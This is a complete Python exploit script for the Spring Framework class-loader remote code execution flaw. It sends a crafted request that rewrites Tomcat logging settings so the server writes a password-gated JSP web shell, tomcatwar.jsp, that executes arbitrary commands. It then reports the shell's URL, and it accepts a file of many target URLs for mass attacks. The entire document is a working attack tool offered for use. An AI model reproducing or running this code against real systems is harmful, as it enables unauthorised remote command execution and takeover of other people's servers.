#!/usr/bin/env python3
# coding:utf-8

import requests
import argparse
from urllib.parse import urljoin


def Exploit(url):
    headers = {
        "c1": '<%',
        "suffix": '%>',
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc1%7Di%20if%28%22j%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%20%7D%20%25%7Bsuffix%7Di%0A'\
        '&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'\
        '&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT'\
        '&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar'\
        '&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

    print(data)
    print(headers)

    try:

        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl, timeout=15,
                               allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"shell地址为:{shellurl}?pwd=j&cmd=calc")

        elif shellgo.status_code == 404:
            go = requests.post(url, headers=headers, data=data,
                               timeout=15, allow_redirects=False, verify=False)

    except Exception as e:
        print(e)
        pass


def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file', help='url file', required=False)
    parser.add_argument('--url', help='target url', required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)


if __name__ == '__main__':
    main()
